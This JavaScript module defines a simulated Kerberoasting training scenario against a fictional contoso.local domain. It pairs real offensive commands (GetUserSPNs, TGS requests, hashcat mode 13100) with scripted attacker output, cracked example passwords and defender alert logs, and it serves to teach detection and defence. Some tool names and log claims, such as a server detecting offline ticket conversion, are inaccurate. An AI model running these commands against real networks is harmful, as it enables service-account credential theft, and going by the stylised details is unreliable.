/**
 * Kerberoasting Attack Scenario
 *
 * This scenario simulates the Kerberoasting attack, where an attacker requests
 * service tickets for accounts with SPNs and attempts to crack them offline.
 */

export const kerberoastScenario = {
  id: 'kerberoasting',
  title: 'Kerberoasting: Service Account Credential Theft',
  description: 'Learn how attackers extract and crack service account credentials using Kerberos service tickets.',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**Kerberoasting** is an attack that exploits the Kerberos authentication protocol to extract and crack service account credentials.

**Attack Flow:**
1. Enumerate Service Principal Names (SPNs) in the domain
2. Request service tickets for accounts with SPNs
3. Extract the TGS (Ticket Granting Service) tickets
4. Crack the tickets offline using a password dictionary

**Why This Matters:**
Service accounts often have weak passwords and high privileges. Kerberoasting can quickly identify and compromise these accounts, leading to lateral movement and privilege escalation.
    
**Note:** This scenario uses the 'svc_backup' credentials compromised in the AS-REP Roasting mission.`,

    steps: [
      {
        number: 1,
        title: 'Enumerate Service Accounts',
        description: 'Use the compromised "svc_backup" account to run an LDAP query. Find the password in your "Files" tab and insert it into the command.',
        command: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/svc_backup:[PASSWORD-FROM-FILES-TAB]',
        tip: 'Check the "Files" tab for the credential you harvested in the AS-REP Roasting scenario.'
      },
      {
        number: 2,
        title: 'Request Service Tickets',
        description: 'Using the "svc_backup" credentials, request Kerberos service tickets (TGS) for each SPN found.',
        command: 'impacket-getTGSs -request contoso.local/svc_backup:[PASSWORD-FROM-FILES-TAB] -spn MSSQLSvc/SQL01.contoso.local',
        tip: 'The TGS ticket is encrypted with the service account\'s password hash, making it crackable offline'
      },
      {
        number: 3,
        title: 'Extract Ticket Hashes',
        description: 'Convert the TGS tickets to a format that can be cracked with Hashcat or John the Ripper.',
        command: 'tgsrepcrack.py wordlist.txt ticket.kirbi',
        tip: 'Extracted hashes are in Kerberos 5 TGS-REP format, compatible with offline crackers'
      },
      {
        number: 4,
        title: 'Crack Passwords',
        description: 'Use a password dictionary to crack the extracted hashes and recover service account credentials.',
        command: 'hashcat -m 13100 tickets.txt wordlist.txt --force',
        tip: 'Common service account passwords are often weak and can be cracked in minutes'
      },
      {
        number: 5,
        title: 'Verify Compromised Accounts',
        description: 'Confirm the cracked credentials work and identify the compromised service accounts.',
        command: null,
        tip: 'Compromised service accounts can now be used for lateral movement and privilege escalation'
      }
    ]
  },

  steps: [
    {
      id: 1,
      expectedCommand: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/svc_backup:[LOOT:svc_backup]',
      attackerOutput: [
        '[*] Enumerating Service Principal Names (SPNs)...',
        '[*] Connecting to DC01.contoso.local (10.0.1.10)',
        '[+] Authentication successful',
        '[*] Querying LDAP for SPN accounts...',
        '[+] Found 12 accounts with SPNs:',
        '[+]   - MSSQLSvc/SQL01.contoso.local (sqlservice)',
        '[+]   - HTTP/webserver01.contoso.local (iis_app)',
        // ... (rest of output)
        '[+] Enumeration complete'
      ],
      serverOutput: [
        '[LDAP] LDAP query from 10.0.0.5:49152',
        '[LDAP] Query: (servicePrincipalName=*)',
        '[LDAP] Returned 12 SPN objects',
        '[AUDIT] SPN enumeration detected from 10.0.0.5',
        '[WARN] Potential Kerberoasting reconnaissance activity'
      ],
      delay: 500
    },
    {
      id: 2,
      expectedCommand: 'impacket-getTGSs -request contoso.local/svc_backup:[LOOT:svc_backup] -spn MSSQLSvc/SQL01.contoso.local',
      attackerOutput: [
        '[*] Requesting TGS for MSSQLSvc/SQL01.contoso.local...',
        '[*] Using credentials: svc_backup@contoso.local',
        '[*] Connecting to KDC...',
        '[+] TGS request successful',
        '[+] Received TGS ticket for sqlservice',
        '[+] Ticket saved to: ticket_sqlservice.kirbi',
        // ... (rest of output)
        '[+] Total tickets extracted: 3'
      ],
      serverOutput: [
        '[KERBEROS] TGS-REQ from 10.0.0.5',
        '[KERBEROS] SPN: MSSQLSvc/SQL01.contoso.local',
        // ... (rest of output)
        '[ALERT] Multiple TGS requests from single source (10.0.0.5)'
      ],
      delay: 400
    },
    {
      id: 3,
      expectedCommand: 'tgsrepcrack.py wordlist.txt ticket.kirbi',
      attackerOutput: [
        '[*] Converting TGS tickets to crackable format...',
        // ... (rest of output)
        '[+] Hashes saved to: kerberoast_hashes.txt'
      ],
      serverOutput: [
        '[KERBEROS] Ticket conversion detected',
        '[SYSTEM] No direct impact (tickets already issued)',
        '[AUDIT] Attacker processing Kerberos tickets offline'
      ],
      delay: 600
    },
    {
      id: 4,
      expectedCommand: 'hashcat -m 13100 tickets.txt wordlist.txt --force',
      attackerOutput: [
        '[*] Starting Hashcat TGS-REP cracking...',
        // ... (rest of output)
        '[+] Hash cracked!',
        '[+] sqlservice : P@ssw0rd123!',
        '[+] Hash cracked!',
        '[+] iis_app : ServicePass2024',
        '[+] Cracking complete - 2 of 3 passwords recovered'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (offline cracking)',
        '[AUDIT] Attacker has extracted service account credentials',
        '[ALERT] Service accounts compromised: sqlservice, iis_app'
      ],
      delay: 500
    },
    {
      id: 5,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] Kerberoasting Attack Summary',
        '[+] ============================================',
        '[+] SPNs Enumerated: 12',
        '[+] Tickets Extracted: 3',
        '[+] Passwords Cracked: 2',
        '[+] Compromised Accounts:',
        '[+]   - sqlservice (P@ssw0rd123!)',
        '[+]   - iis_app (ServicePass2024)',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use compromised credentials for lateral movement',
        '[*] 2. Access SQL Server or IIS with service account',
        '[*] 3. Escalate privileges to Domain Admin',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] Service account credentials compromised',
        '[ALERT] Recommend immediate password reset for:',
        '[ALERT]   - sqlservice',
        '[ALERT]   - iis_app',
        '[ALERT] Review recent access logs for lateral movement'
      ],
      delay: 400
    }
  ]
};

export default kerberoastScenario;